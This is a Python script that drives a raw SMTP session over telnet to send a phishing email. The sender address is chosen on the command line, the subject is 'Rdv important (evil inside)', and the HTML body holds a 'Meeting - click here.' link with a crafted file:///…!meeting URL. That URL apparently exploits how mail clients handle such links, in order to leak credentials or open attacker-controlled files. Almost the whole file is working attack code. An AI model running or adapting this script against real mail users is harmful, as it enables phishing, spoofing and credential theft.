import sys
import pexpect

named_args = {
    '-host': None,
    '-port': None,
    '-from': None,
    '-recipient': None,
    '-url': None
}

for i in range(1, len(sys.argv), 2):
    arg_name = sys.argv[i]
    arg_value = sys.argv[i + 1]
    named_args[arg_name] = arg_value

host = named_args['-host']
port = named_args['-port']
from_email = named_args['-from']
recipient_email = named_args['-recipient']
url = named_args['-url']
separator = "duy31"

child = pexpect.spawn(f"telnet {host} {port}")
child.timeout = -1  # Setting timeout to -1 for indefinite waiting
child.expect("220")

child.sendline(f"HELO {host}")
child.expect("250")

child.sendline(f"mail from:<{from_email}>")
child.expect("250")

child.sendline(f"rcpt to:<{recipient_email}>")
child.expect("250")

child.sendline("data")
child.expect("354")

child.sendline(f"From: <{from_email}>")
child.sendline(f"To: <{recipient_email}>")
child.sendline("Subject: Rdv important (evil inside)")
child.sendline("Mime-Version: 1.0;")
child.sendline(f"Content-Type: multipart/alternative; boundary={separator}")
child.sendline("duy-31 inside ")

child.sendline(f"--{separator}")
child.sendline("Content-Type: text/plain; charset=us-ascii")
child.sendline("This should be read in HTML")

child.sendline(f"--{separator}")
child.sendline("Content-Type: text/html; charset=ISO-8859-1")
child.sendline("<html>")
child.sendline("<body>")
child.sendline(f"<h1><a href=\"file:///{url}!meeting\">Meeting - click here.</a></h1>")
child.sendline("</body>")
child.sendline("</html>")

child.sendline(f"--{separator}--")
child.sendline(".")
child.sendline("Quit")
